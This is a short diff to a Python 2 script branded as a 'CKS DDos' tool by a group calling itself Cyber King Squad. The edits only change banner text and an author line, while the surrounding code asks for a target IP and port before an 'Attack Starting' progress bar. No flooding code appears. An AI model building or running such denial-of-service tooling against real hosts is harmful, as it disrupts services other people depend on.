@@ -22,14 +22,14 @@ os.system("figlet CKS DDos")
 print
 print "Author   : Rh@King"
 print "You Tube : https://www.youtube.com/Cyber.king.Squad"
-print "github   : https://github.com/Rh.king"
+print "team.CKS : white-hat-Hackers"
 print "Facebook : https://www.facebook.com/cyber king squad"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet CKS Attack Starting")
 print "[                    ] 0% Cks "
 time.sleep(5)
 print "[=====               ] 25% Cks"
